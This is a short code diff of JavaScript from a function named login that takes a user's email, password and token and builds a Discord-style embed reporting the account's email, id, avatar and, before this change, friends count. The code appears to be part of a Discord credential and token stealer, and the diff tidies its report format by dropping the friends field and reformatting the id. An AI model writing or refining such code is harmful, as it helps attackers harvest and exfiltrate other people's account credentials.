@@ -625,11 +625,6 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Friends:',
-            value: `\`${friends}\``,
-            inline: true,
-          },
-          {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
             inline: true,
@@ -646,7 +641,7 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          name: json.username + '#' + json.discriminator + ' - ' + '('+json.id+')',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
